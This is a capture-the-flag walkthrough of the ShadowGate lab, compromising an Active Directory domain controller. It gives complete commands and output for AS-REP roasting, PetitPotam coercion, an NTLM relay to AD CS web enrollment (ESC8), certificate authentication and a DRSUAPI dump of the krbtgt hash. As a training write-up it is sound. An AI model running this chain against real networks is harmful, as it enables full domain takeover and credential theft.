# ShadowGate (Easy) — Hack Smarter Walkthrough

**Platform:** Hack Smarter  
**Challenge:** ShadowGate  
**Difficulty:** Easy  
**Target:** `10.1.165.77`  
**Domain:** `shadow.gate`  
**Objective:** Retrieve the `krbtgt` NT hash  
**Initial Access:** VPN access without credentials

## Reconnaissance

After connecting to the lab VPN, I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sCV 10.1.165.77
```

**Command explanation:**

- `-sC`: Runs Nmap's default NSE scripts.
- `-sV`: Detects service versions.
- `10.1.165.77`: Target IP address.

**Relevant results:**

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
3268/tcp open  ldap
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The LDAP and RDP information revealed:

```text
Hostname: DC01.shadow.gate
Domain: shadow.gate
NetBIOS Domain: SHADOW
OS: Windows Server 2022 Build 20348
```

The target was an Active Directory Domain Controller.

## SMB Enumeration

I used NetExec to check whether anonymous SMB enumeration was possible.

```bash
nxc smb 10.1.165.77 -u '' -p '' --shares
```

**Command explanation:**

- `smb`: Uses the SMB protocol.
- `-u ''`: Attempts authentication with an empty username.
- `-p ''`: Uses an empty password.
- `--shares`: Enumerates available SMB shares.

**Result:**

```text
[+] shadow.gate\:
[-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Anonymous authentication succeeded, but share enumeration was denied.

Next, I attempted to enumerate domain users.

```bash
nxc smb 10.1.165.77 -u '' -p '' --users
```

**Result:**

```text
Administrator
Guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
```

Anonymous SMB user enumeration worked, revealing 12 domain accounts.

I saved the nine regular named accounts to a file.

```bash
cat > users.txt << 'EOF'
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
EOF
```

This list was used for Kerberos enumeration.

## AS-REP Roasting

With a valid username list, I checked whether any accounts had Kerberos pre-authentication disabled.

```bash
impacket-GetNPUsers shadow.gate/ \
  -dc-ip 10.1.165.77 \
  -usersfile users.txt \
  -no-pass \
  -outputfile asrep.hash
```

**Command explanation:**

- `shadow.gate/`: Specifies the target Active Directory domain.
- `-dc-ip`: Specifies the Domain Controller IP address.
- `-usersfile`: Supplies a list of usernames to test.
- `-no-pass`: Performs the check without providing a password.
- `-outputfile`: Saves any returned AS-REP hashes.

**Result:**

```text
[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set

$krb5asrep$23$jtrueblood@SHADOW.GATE:...

[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The account `jtrueblood` had Kerberos pre-authentication disabled, allowing an AS-REP response to be requested without valid credentials.

I used Hashcat to attempt offline password recovery.

```bash
hashcat -m 18200 -a 0 \
  asrep.hash \
  /usr/share/wordlists/rockyou.txt
```

**Command explanation:**

- `-m 18200`: Kerberos 5 AS-REP, etype 23.
- `-a 0`: Dictionary attack mode.
- `asrep.hash`: Captured AS-REP hash.
- `rockyou.txt`: Password wordlist.

**Result:**

```text
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Recovered........: 1/1 (100.00%)
```

Recovered credentials:

```text
Username: jtrueblood
Password: blood_brothers
Domain: shadow.gate
```

## Credential Validation

I validated the recovered credentials using NetExec.

```bash
nxc smb 10.1.165.77 \
  -d shadow.gate \
  -u jtrueblood \
  -p 'blood_brothers'
```

**Result:**

```text
[+] shadow.gate\jtrueblood:blood_brothers
```

SMB authentication succeeded.

Next, I enumerated accessible shares.

```bash
nxc smb 10.1.165.77 \
  -d shadow.gate \
  -u jtrueblood \
  -p 'blood_brothers' \
  --shares
```

**Result:**

```text
Share           Permissions
-----           -----------
ADMIN$
C$
CertEnroll      READ
IPC$            READ
NETLOGON        READ
SYSVOL          READ
```

The `CertEnroll` share suggested that Active Directory Certificate Services (AD CS) was installed.

I also tested WinRM access.

```bash
nxc winrm 10.1.165.77 \
  -d shadow.gate \
  -u jtrueblood \
  -p 'blood_brothers'
```

**Result:**

```text
[-] shadow.gate\jtrueblood:blood_brothers
```

WinRM authentication failed, so I continued investigating AD CS.

## AD CS Enumeration

I used Certipy to enumerate certificate authorities and certificate templates.

```bash
certipy-ad find \
  -u 'jtrueblood@shadow.gate' \
  -p 'blood_brothers' \
  -dc-ip 10.1.165.77 \
  -enabled \
  -stdout
```

**Command explanation:**

- `find`: Enumerates AD CS configuration.
- `-u`: Domain username.
- `-p`: Password.
- `-dc-ip`: Domain Controller IP.
- `-enabled`: Focuses on enabled certificate templates.
- `-stdout`: Prints results to the terminal.

**Relevant results:**

```text
Found 0 certificate templates
Found 1 certificate authority
Found 0 enabled certificate templates

CA Name: shadow-DC01-CA
DNS Name: DC01.shadow.gate

Web Enrollment:
  HTTP Enabled: True
  HTTPS Enabled: False

User Specified SAN: Disabled
Request Disposition: Issue
Enforce Encryption for Requests: Enabled

Permissions:
  Enroll: SHADOW.GATE\Authenticated Users

Vulnerabilities:
  ESC8: Web Enrollment is enabled over HTTP.
```

Certipy identified a potential ESC8 vulnerability.

However, it could not enumerate any certificate templates, and its web enrollment check timed out.

To verify the enrollment endpoint manually, I used curl.

```bash
curl -i --max-time 10 \
  http://10.1.165.77/certsrv/
```

**Result:**

```text
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
```

This confirmed that AD CS Web Enrollment was reachable over HTTP and supported NTLM authentication.

These conditions made an NTLM relay attack worth investigating.

## PetitPotam Authentication Coercion

I cloned the PetitPotam repository.

```bash
git clone https://github.com/topotam/PetitPotam
```

PetitPotam uses MS-EFSRPC functions to coerce a Windows machine into making an authentication attempt to an attacker-controlled listener.

The attack setup used:

```text
Domain Controller: 10.1.165.77
Attacker VPN IP:   10.200.122.102
Domain:            shadow.gate
```

I prepared an NTLM relay listener targeting the AD CS enrollment endpoint.

```bash
impacket-ntlmrelayx \
  -t http://10.1.165.77/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

**Command explanation:**

- `-t`: Specifies the HTTP endpoint to relay authentication to.
- `-smb2support`: Enables SMB2 support.
- `--adcs`: Enables Impacket's AD CS certificate enrollment functionality.
- `--template DomainController`: Requests a certificate using the `DomainController` template.

**Initial result:**

```text
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

In another terminal, I executed PetitPotam.

```bash
python3 PetitPotam/PetitPotam.py \
  -d shadow.gate \
  -u jtrueblood \
  -p blood_brothers \
  10.200.122.102 \
  10.1.165.77
```

**Command explanation:**

- `-d`: Active Directory domain.
- `-u`: Authenticated domain user.
- `-p`: Password.
- `10.200.122.102`: Attacker's VPN IP address.
- `10.1.165.77`: Target Domain Controller.

**Result:**

```text
[+] Connected!
[+] Successfully bound!

[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!

[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!

[+] Attack worked!
```

The first EFSRPC method returned access denied, but PetitPotam successfully used another function.

The relay listener then received authentication from the Domain Controller.

```text
[*] (SMB): Received connection from 10.1.165.77
[*] HTTP server returned error code 200
[*] Authenticating connection ... SUCCEED
[*] Generating CSR...
```

The authentication relay succeeded, but certificate request generation encountered a local error.

## Troubleshooting — Impacket and pyOpenSSL

The initial certificate request failed with:

```text
AttributeError: module 'OpenSSL.crypto'
has no attribute 'X509Req'
```

The installed versions were:

```text
Python: 3.14.8
Impacket: 0.14.0.dev0
pyOpenSSL: 26.4.0
X509Req available: False
```

The installed Impacket implementation depended on the legacy `crypto.X509Req()` API, which was unavailable in the system's newer pyOpenSSL version.

I initially attempted to downgrade pyOpenSSL, but installing the older dependencies into the user-level Python environment caused another problem.

```text
ImportError: cannot import name 'asn1'
from 'cryptography.hazmat'
```

This happened because Python was loading an older user-installed `cryptography` package alongside newer Kali system packages.

I removed the conflicting user-installed packages.

```bash
python3 -m pip uninstall cryptography pyOpenSSL \
  --break-system-packages
```

I then created an isolated Python 3.13 virtual environment to avoid changing Kali's system dependencies.

```bash
mkdir -p ~/venvs

python3.13 -m venv ~/venvs/openssl-legacy

source ~/venvs/openssl-legacy/bin/activate
```

I installed compatible legacy dependencies and Impacket.

```bash
python -m pip install --upgrade pip

python -m pip install \
  'pyOpenSSL==22.1.0' \
  'cryptography==38.0.4' \
  'impacket==0.13.1'
```

I verified the availability of the missing API.

```bash
python -c \
  "from OpenSSL import crypto; print('X509Req:', hasattr(crypto, 'X509Req'))"
```

**Result:**

```text
X509Req: True
```

This confirmed that the legacy OpenSSL API was available in the virtual environment.

Another issue occurred when attempting to run the system's `impacket-ntlmrelayx` launcher directly through Python.

```text
SyntaxError: invalid syntax
```

The launcher at `/usr/bin/impacket-ntlmrelayx` was a shell wrapper rather than a Python script.

I resolved this by executing the actual Python script using the virtual environment's interpreter.

```bash
python /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -t http://10.1.165.77/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

This time, certificate generation completed successfully.

## Successful AD CS ESC8 Exploitation

After restarting the relay listener in the compatible Python environment, the Domain Controller authentication was relayed successfully.

**Result:**

```text
[*] (SMB): Received connection from 10.1.165.77
[*] Authenticating connection ... SUCCEED

[*] Using template name: DomainController
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...

[*] GOT CERTIFICATE! ID 10

[*] Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
[*] Certificate successfully written to file
```

The Certificate Authority issued a certificate for the Domain Controller.

The generated file was:

```text
DC01.shadow.gate.pfx
```

This PKCS#12 file contained the certificate and corresponding private key.

## Domain Controller Authentication

I used Certipy to authenticate with the issued certificate.

```bash
certipy-ad auth \
  -pfx DC01.shadow.gate.pfx \
  -dc-ip 10.1.165.77
```

**Command explanation:**

- `auth`: Performs certificate-based authentication.
- `-pfx`: Specifies the PKCS#12 certificate file.
- `-dc-ip`: Specifies the Domain Controller.

**Result:**

```text
Certificate identities:
  SAN DNS Host Name: DC01.shadow.gate
  Security Extension SID: S-1-5-21-243493930-1113464705-3012771586-1000

Using principal: dc01$@shadow.gate

[*] Trying to get TGT...
[*] Got TGT

[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'

[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': [REDACTED]
```

Certipy successfully authenticated as the `DC01$` machine account, obtained a Kerberos Ticket Granting Ticket (TGT), and retrieved the machine account's NT hash.

The recovered account was `DC01$`, not `krbtgt`, so the challenge objective was not yet complete.

## Retrieving the KRBTGT NT Hash

With the Domain Controller machine account's NT hash, I attempted to retrieve domain secrets using Impacket.

```bash
impacket-secretsdump \
  -hashes 0:<DC01_NT_HASH> \
  'shadow.gate/DC01$@10.1.165.77'
```

**Command explanation:**

- `-hashes`: Supplies LM and NT hashes for pass-the-hash authentication.
- `0:<DC01_NT_HASH>`: Uses the recovered machine account NT hash.
- `shadow.gate/DC01$`: Specifies the Domain Controller machine account.
- `@10.1.165.77`: Specifies the target Domain Controller.

The first remote operation failed.

```text
[-] RemoteOperations failed:
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

However, Impacket continued using DRSUAPI.

```text
[*] Dumping Domain Credentials
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

The DRSUAPI method succeeded and returned domain account hashes, including the `krbtgt` account.

**Relevant result:**

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e0****:::
```

Impacket also retrieved Kerberos key material for the domain accounts.

```text
[*] Kerberos keys grabbed
[*] Cleaning up...
```

Despite the earlier RPC access-denied message, directory replication succeeded.

## Challenge Result

**Objective:** Retrieve the `krbtgt` NT hash.

**Status:** Completed

```text
Domain: shadow.gate
Account: krbtgt
RID: 502
NT Hash: b5509cbfe52e94940c0ec99b21e0****
```

The final four characters of the NT hash have been masked.

## Conclusion

The ShadowGate Domain Controller was compromised through a chain of Active Directory weaknesses.

The initial foothold came from AS-REP Roasting against `jtrueblood`, whose account did not require Kerberos pre-authentication. After recovering the user's password, I discovered AD CS Web Enrollment exposed over HTTP with NTLM authentication enabled.

Using PetitPotam, I coerced authentication from the Domain Controller and relayed it to the AD CS enrollment endpoint. The Certificate Authority issued a certificate for the `DC01$` machine account.

Certificate-based authentication then allowed recovery of the Domain Controller machine account's NT hash. Finally, Impacket's DRSUAPI method retrieved the `krbtgt` NT hash and completed the challenge.

**Attack chain:**

```text
Anonymous SMB Enumeration
        |
        v
Domain Username Discovery
        |
        v
AS-REP Roasting (jtrueblood)
        |
        v
Offline Password Recovery
        |
        v
Authenticated Domain Access
        |
        v
AD CS ESC8 Discovery
        |
        v
PetitPotam Authentication Coercion
        |
        v
NTLM Relay to AD CS
        |
        v
Domain Controller Certificate Issued
        |
        v
Certificate-Based Authentication
        |
        v
DC01$ NT Hash Recovered
        |
        v
DRSUAPI Replication
        |
        v
KRBTGT NT Hash Retrieved
```

The key lesson from this lab is how multiple security misconfigurations can be chained together to achieve complete Active Directory domain compromise, even when the attacker starts with only network access and no credentials.